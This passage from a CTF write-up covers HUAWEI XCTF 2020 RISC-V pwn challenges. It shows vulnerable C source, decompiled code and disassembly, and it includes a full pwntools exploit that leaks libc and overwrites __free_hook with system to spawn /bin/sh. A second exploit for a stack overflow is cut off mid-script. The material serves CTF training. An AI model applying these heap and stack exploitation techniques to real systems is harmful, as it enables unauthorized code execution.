plist[idx] = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(size);<br>	<span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;msg:&quot;</span>;<br>	<span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt;= size; ++i) &#123;<br>		read(<span class="hljs-number">0</span>, plist[idx] + i, <span class="hljs-number">1</span>);<br>		<span class="hljs-keyword">if</span>(*(plist[idx] + i) == <span class="hljs-string">&#x27;\n&#x27;</span>)<br>			<span class="hljs-keyword">break</span>;<br>	&#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">del</span><span class="hljs-params">()</span> &#123;<br>	<span class="hljs-type">int</span> idx;<br>	<span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;idx:&quot;</span>;<br>	<span class="hljs-built_in">std</span>::<span class="hljs-built_in">cin</span> &gt;&gt; idx;<br>	<span class="hljs-keyword">if</span>(plist[idx] == nullptr) &#123;<br>		<span class="hljs-keyword">return</span> ;<br>	&#125;<br>	<span class="hljs-built_in">free</span>(plist[idx]);<br><br>	delete[] pname[idx];<br>	pname[idx] = nullptr;<br>	plist[idx] = nullptr;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">show</span><span class="hljs-params">()</span> &#123;<br>	<span class="hljs-type">int</span> idx;	<br>	<span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;idx:&quot;</span>;<br>	<span class="hljs-built_in">std</span>::<span class="hljs-built_in">cin</span> &gt;&gt; idx;<br>	<span class="hljs-keyword">if</span>(plist[idx] == nullptr) &#123;<br>		<span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;err&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;<br>		<span class="hljs-keyword">return</span> ;<br>	&#125;<br>	<span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;msg:&quot;</span> &lt;&lt; plist[idx] &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">modify</span><span class="hljs-params">()</span> &#123;<br>	<span class="hljs-type">int</span> idx;<br>	<span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;idx:&quot;</span>;<br>	<span class="hljs-built_in">std</span>::<span class="hljs-built_in">cin</span> &gt;&gt; idx;<br>	<span class="hljs-keyword">if</span>(plist[idx] == nullptr) &#123;<br>		<span class="hljs-keyword">return</span> ;<br>	&#125;<br>	<span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;msg:&quot;</span>;<br>	<span class="hljs-type">size_t</span> size = <span class="hljs-number">0xf8</span>;<br>	<span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; size; ++i) &#123;<br>		read(<span class="hljs-number">0</span>, plist[idx] + i, <span class="hljs-number">1</span>);<br>		<span class="hljs-keyword">if</span>(*(plist[idx] + i) == <span class="hljs-string">&#x27;\n&#x27;</span>)<br>			<span class="hljs-keyword">break</span>;<br>	&#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span>, <span class="hljs-type">char</span>**)</span> &#123;<br>    init();<br>	func();<br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>



<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment">#-*- coding:utf-8 -*-</span><br><span class="hljs-comment"># Author: i0gan</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br>r   =  <span class="hljs-keyword">lambda</span> x : io.recv(x)<br>ra  =  <span class="hljs-keyword">lambda</span>   : io.recvall()<br>rl  =  <span class="hljs-keyword">lambda</span>   : io.recvline(keepends = <span class="hljs-literal">True</span>)<br>ru  =  <span class="hljs-keyword">lambda</span> x : io.recvuntil(x, drop = <span class="hljs-literal">True</span>)<br>s   =  <span class="hljs-keyword">lambda</span> x : io.send(x)<br>sl  =  <span class="hljs-keyword">lambda</span> x : io.sendline(x)<br>sa  =  <span class="hljs-keyword">lambda</span> x, y : io.sendafter(x, y)<br>sla =  <span class="hljs-keyword">lambda</span> x, y : io.sendlineafter(x, y)<br>ia  =  <span class="hljs-keyword">lambda</span> : io.interactive()<br>c   =  <span class="hljs-keyword">lambda</span> : io.close()<br>li    = <span class="hljs-keyword">lambda</span> x : log.info(<span class="hljs-string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="hljs-string">&#x27;\x1b[0m&#x27;</span>)<br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-comment">#context.arch=&#x27;em_riscv-64-little&#x27;</span><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>]<br><br>elf_path  = <span class="hljs-string">&#x27;./honorbook&#x27;</span><br><span class="hljs-comment">#libc_path = &#x27;/glibc/2.23/64/lib/libc.so.6&#x27;</span><br>libc_path = <span class="hljs-string">&#x27;libs/lib/libc.so.6&#x27;</span><br><br><span class="hljs-comment"># remote server ip and port</span><br>server_ip = <span class="hljs-string">&quot;121.36.192.114&quot;</span><br>server_port = <span class="hljs-number">9999</span><br><br><span class="hljs-comment"># if local debug</span><br>LOCAL = <span class="hljs-number">1</span><br>LIBC  = <span class="hljs-number">1</span><br><span class="hljs-comment">#--------------------------func-----------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">db</span>():<br>	<span class="hljs-keyword">if</span>(LOCAL):<br>		gdb.attach(io)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ad</span>(<span class="hljs-params">idx, n, d</span>):<br>	sla(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br>	sla(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(idx))<br>	sa(<span class="hljs-string">&#x27;:&#x27;</span>, n) <span class="hljs-comment"># max 0x18</span><br>	sa(<span class="hljs-string">&#x27;:&#x27;</span>, d) <span class="hljs-comment"># max 0xE9</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rm</span>(<span class="hljs-params">idx</span>):<br>	sla(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)<br>	sla(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dp</span>(<span class="hljs-params">idx</span>):<br>	sla(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)<br>	sla(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">md</span>(<span class="hljs-params">idx, d</span>):<br>	sla(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>)<br>	sla(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(idx))<br>	sa(<span class="hljs-string">&#x27;:&#x27;</span>, d) <span class="hljs-comment"># max 0xE9</span><br><br><span class="hljs-comment">#--------------------------exploit--------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>():<br>	li(<span class="hljs-string">&#x27;exploit...&#x27;</span>)<br>	<span class="hljs-comment"># name -&gt; size == 0x30</span><br>	<span class="hljs-comment"># body -&gt; size == 0x100</span><br><br>	<span class="hljs-comment">#ad(0, &#x27;A&#x27; * 0x18, &#x27;D&#x27; * 0xE9)</span><br>	<span class="hljs-comment"># leak libc</span><br><br>	<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>		ad(i, <span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>)<br><br>	<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>		rm(<span class="hljs-number">7</span> - i)<br>	<br>	<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>		ad(i, <span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>)<br>	ad(<span class="hljs-number">7</span>, <span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-string">&#x27;AAAAAAA\n&#x27;</span>)<br>	dp(<span class="hljs-number">7</span>)<br><br>	ru(<span class="hljs-string">&#x27;AA\n&#x27;</span>)<br>	<span class="hljs-comment">#libc.sym[&#x27;__malloc_hook&#x27;]</span><br>	leak = u64(ru(<span class="hljs-string">&#x27;\n&#x27;</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>	libc_base = <span class="hljs-number">0x4000000000</span> + leak - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>] - <span class="hljs-number">88</span> - <span class="hljs-number">0x10</span><br><br>	system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>	__free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br><br>	rm(<span class="hljs-number">2</span>)<br>	rm(<span class="hljs-number">0</span>)<br>	ad(<span class="hljs-number">0</span>, <span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">0xe8</span> + <span class="hljs-string">&#x27;\xf1&#x27;</span>)<br>	rm(<span class="hljs-number">1</span>)<br>	p =  <span class="hljs-string">b&#x27;B&#x27;</span> * <span class="hljs-number">0x20</span><br>	p += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xf1</span>)<br>	p += p64(__free_hook) + p64(<span class="hljs-number">0</span>)<br>	p += <span class="hljs-string">b&#x27;\n&#x27;</span><br>	ad(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;A&#x27;</span>, p)<br><br>	li(<span class="hljs-string">&#x27;leak: &#x27;</span> + <span class="hljs-built_in">hex</span>(leak))<br>	li(<span class="hljs-string">&#x27;libc_base: &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br>	li(<span class="hljs-string">&#x27;free_hook: &#x27;</span> + <span class="hljs-built_in">hex</span>(__free_hook))<br>	li(<span class="hljs-string">&#x27;system: &#x27;</span> + <span class="hljs-built_in">hex</span>(system))<br><br>	ad(<span class="hljs-number">9</span>, <span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>, <span class="hljs-string">&#x27;/bin/sh\x00\n&#x27;</span>)<br>	ad(<span class="hljs-number">10</span>, <span class="hljs-string">&#x27;A&#x27;</span>, p64(system) + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>	rm(<span class="hljs-number">9</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">finish</span>():<br>	ia()<br>	c()<br><span class="hljs-comment">#--------------------------main-----------------------------</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>	<span class="hljs-keyword">if</span> LOCAL:<br>		<span class="hljs-keyword">if</span> LIBC:<br>			libc = ELF(libc_path)<br>			<span class="hljs-comment">#io = elf.process(env = &#123;&quot;LD_PRELOAD&quot; : libc_path&#125; )</span><br>			io = process([<span class="hljs-string">&#x27;./qemu-riscv64&#x27;</span>, <span class="hljs-string">&#x27;-L&#x27;</span> , <span class="hljs-string">&#x27;./libs&#x27;</span>, elf_path])<br>			<span class="hljs-comment">#io = process([&#x27;/usr/bin/qemu-riscv64-static&#x27;, &#x27;-g&#x27;, &#x27;1235&#x27;, &#x27;-L&#x27; , &#x27;./libs&#x27;, elf_path])</span><br>		<span class="hljs-keyword">else</span>:<br>			<span class="hljs-comment">#io = elf.process()</span><br>			<span class="hljs-comment">#io = process([&#x27;./qemu-riscv64&#x27;, &#x27;-L&#x27; , &#x27;./libs&#x27;, elf_path])</span><br>			io = process([<span class="hljs-string">&#x27;/usr/bin/qemu-riscv64-static&#x27;</span>, <span class="hljs-string">&#x27;-g&#x27;</span>, <span class="hljs-string">&#x27;1234&#x27;</span>, <span class="hljs-string">&#x27;-L&#x27;</span> , <span class="hljs-string">&#x27;./libs&#x27;</span>, elf_path])<br>	<span class="hljs-keyword">else</span>:<br>		io = remote(server_ip, server_port)<br>		<span class="hljs-keyword">if</span> LIBC:<br>			libc = ELF(libc_path)<br>	exploit()<br>	finish()<br><br></code></pre></td></tr></table></figure>







<h1 id="HUAWEI-XCTF-2020-Third"><a href="#HUAWEI-XCTF-2020-Third" class="headerlink" title="HUAWEI XCTF 2020 Third"></a>HUAWEI XCTF 2020 Third</h1><h2 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h2><h3 id="checksec-1"><a href="#checksec-1" class="headerlink" title="checksec"></a>checksec</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Arch:     em_riscv-64-little<br>RELRO:    Partial RELRO<br>Stack:    No canary found<br>NX:       NX disabled<br>PIE:      No PIE (0x10000)<br>RWX:      Has RWX segments<br></code></pre></td></tr></table></figure>

<p>It’s a riscv-64 arch, We have to use latest ghidra decompilier to annalize this program, version as: 9.21</p>
<h3 id="vul"><a href="#vul" class="headerlink" title="vul"></a>vul</h3><p>In echo function, there is a stackoverflow vulnerability.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">echo</span><span class="hljs-params">(longlong param_1)</span><br>&#123;<br>  longlong lVar1;<br>  <span class="hljs-type">char</span> **ppcVar2;<br>  <span class="hljs-type">char</span> *pcVar3;<br>  <span class="hljs-type">char</span> *__s2;<br>  <span class="hljs-type">int</span> iVar4;<br>  <span class="hljs-type">ssize_t</span> sVar5;<br>  undefined4 extraout_var;<br>  undefined4 extraout_var_00;<br>  undefined4 extraout_var_01;<br>  <span class="hljs-type">size_t</span> __nbytes;<br>  longlong lVar6;<br>  undefined auStack320 [<span class="hljs-number">264</span>];<br>  <br>  lVar1 = *(longlong *)(param_1 + <span class="hljs-number">8</span>);<br>  pcVar3 = *(<span class="hljs-type">char</span> **)(lVar1 + <span class="hljs-number">8</span>);<br>  iVar4 = <span class="hljs-built_in">strcmp</span>(pcVar3,<span class="hljs-string">&quot;&gt;&quot;</span>);<br>  <span class="hljs-keyword">if</span> (CONCAT44(extraout_var,iVar4) == <span class="hljs-number">0</span>) &#123;<br>    lVar6 = <span class="hljs-number">0</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span> &#123;<br>    iVar4 = <span class="hljs-built_in">strcmp</span>(pcVar3,<span class="hljs-string">&quot;&gt;&gt;&quot;</span>);<br>    lVar6 = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> (CONCAT44(extraout_var_00,iVar4) != <span class="hljs-number">0</span>) &#123;<br>                    <span class="hljs-comment">/* WARNING: Subroutine does not return*/</span><br>      error();<br>    &#125;<br>  &#125;<br>  pcVar3 = *(<span class="hljs-type">char</span> **)(lVar1 + <span class="hljs-number">0x10</span>);<br>  ppcVar2 = (<span class="hljs-type">char</span> **)&amp;gp0xfffffffffffffa60;<br>  <span class="hljs-keyword">while</span> ((__s2 = *ppcVar2, __s2 == (<span class="hljs-type">char</span> *)<span class="hljs-number">0x0</span> ||<br>         (iVar4 = <span class="hljs-built_in">strcmp</span>(pcVar3,__s2),CONCAT44(extraout_var_01,iVar4) != <span class="hljs-number">0</span>))) &#123;<br>    ppcVar2 = ppcVar2 + <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> (ppcVar2 == (<span class="hljs-type">char</span> **)&amp;gp0xfffffffffffffbe0) &#123;<br>      __nbytes = <span class="hljs-number">0x200</span>;<br>LAB_00011516:<br>      sVar5 = read(<span class="hljs-number">0</span>,auStack320,__nbytes); <span class="hljs-comment">// vul</span><br>      FUN_000113e2(*(<span class="hljs-type">char</span> **)(*(longlong *)(param_1 +<span class="hljs-number">8</span>) + <span class="hljs-number">0x10</span>),auStack320,(longlong)sVar5,lVar6);<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br>  &#125;<br>  __nbytes = *(<span class="hljs-type">size_t</span> *)(__s2 + <span class="hljs-number">0x18</span>);<br>  <span class="hljs-keyword">goto</span> LAB_00011516;<br>&#125;<br></code></pre></td></tr></table></figure>



<p>Use unsorted bin leak to leak libc address then use return-to-csu method to get shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">                     LAB_0001181a                                    XREF[1]:     00011828(j)  <br>0001181a 1c 60           c.ld       a5,0x0(s0=&gt;-&gt;_INIT_0)                            = 10F84h<br>                                                                                     = 11056h<br>0001181c 56 86           c.mv       a2,s5<br>0001181e d2 85           c.mv       a1,s4<br>00011820 4e 85           c.mv       a0,s3<br>00011822 85 04           c.addi     s1,0x1<br>00011824 82 97           c.jalr     a5=&gt;_INIT_0                                      undefined _INIT_1(void)<br>                                                                                     undefined _INIT_0(void)<br>00011826 21 04           c.addi     s0,0x8<br>00011828 e3 19 99 fe     bne        s2,s1,LAB_0001181a<br>                     LAB_0001182c                                    XREF[1]:     0001180e(j)  <br>0001182c e2 70           c.ldsp     ra,0x38(sp)<br>0001182e 42 74           c.ldsp     s0,0x30(sp)<br>00011830 a2 74           c.ldsp     s1,0x28(sp)<br>00011832 02 79           c.ldsp     s2,0x20(sp)<br>00011834 e2 69           c.ldsp     s3,0x18(sp)<br>00011836 42 6a           c.ldsp     s4,0x10(sp)<br>00011838 a2 6a           c.ldsp     s5,0x8(sp)<br>0001183a 21 61           c.addi16sp sp,0x40<br>0001183c 82 80           ret<br></code></pre></td></tr></table></figure>

<h3 id="gdb-script"><a href="#gdb-script" class="headerlink" title="gdb script"></a>gdb script</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#! /bin/sh</span><br>gdb-multiarch --nh \<br>        -ex <span class="hljs-string">&quot;add-symbol-file ./harmoshell&quot;</span> \<br>        -ex <span class="hljs-string">&quot;set architecture riscv:rv64&quot;</span> \<br>        -ex <span class="hljs-string">&quot;target remote 127.0.0.1:1234&quot;</span><br></code></pre></td></tr></table></figure>

<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment">#-*- coding:utf-8 -*-</span><br><span class="hljs-comment"># Author: i0gan</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br>r   =  <span class="hljs-keyword">lambda</span> x : io.recv(x)<br>ra  =  <span class="hljs-keyword">lambda</span>   : io.recvall()<br>rl  =  <span class="hljs-keyword">lambda</span>   : io.recvline(keepends = <span class="hljs-literal">True</span>)<br>ru  =  <span class="hljs-keyword">lambda</span> x : io.recvuntil(x, drop = <span class="hljs-literal">True</span>)<br>s   =  <span class="hljs-keyword">lambda</span> x : io.send(x)<br>sl  =  <span class="hljs-keyword">lambda</span> x : io.sendline(x)<br>sa  =  <span class="hljs-keyword">lambda</span> x, y : io.sendafter(x, y)<br>sla =  <span class="hljs-keyword">lambda</span> x, y : io.sendlineafter(x, y)<br>ia  =  <span class="hljs-keyword">lambda</span> : io.interactive()<br>c   =  <span class="hljs-keyword">lambda</span> : io.close()<br>li    = <span class="hljs-keyword">lambda</span> x : log.info(<span class="hljs-string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="hljs-string">&#x27;\x1b[0m&#x27;</span>)<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>]<br><br>elf_path  = <span class="hljs-string">&#x27;./harmoshell&#x27;</span><br><span class="hljs-comment">#libc_path = &#x27;/glibc/2.23/64/lib/libc.so.6&#x27;</span><br>libc_path = <span class="hljs-string">&#x27;libs/lib/libc.so.6&#x27;</span><br><br><span class="hljs-comment"># remote server ip and port</span><br>server_ip = <span class="hljs-string">&quot;121.36.192.114&quot;</span><br>server_port = <span class="hljs-number">9999</span><br><br><span class="hljs-comment"># if local debug</span><br>LOCAL = <span class="hljs-number">1</span><br>LIBC  = <span class="hljs-number">1</span><br><span class="hljs-comment">#--------------------------func-----------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">db</span>():<br>	<span class="hljs-keyword">if</span>(LOCAL):<br>		gdb.attach(io)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">touch</span>(<span class="hljs-params">n</span>):<br>	sla(<span class="hljs-string">&#x27;$&#x27;</span>, <span class="hljs-string">b&#x27;touch &#x27;</span> + n)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rm</span>(<span class="hljs-params">n</span>):<br>	sla(<span class="hljs-string">&#x27;$&#x27;</span>, <span class="hljs-string">b&#x27;rm &#x27;</span> + n)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ls</span>():<br>	sla(<span class="hljs-string">&#x27;$&#x27;</span>, <span class="hljs-string">&#x27;ls&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cat</span>(<span 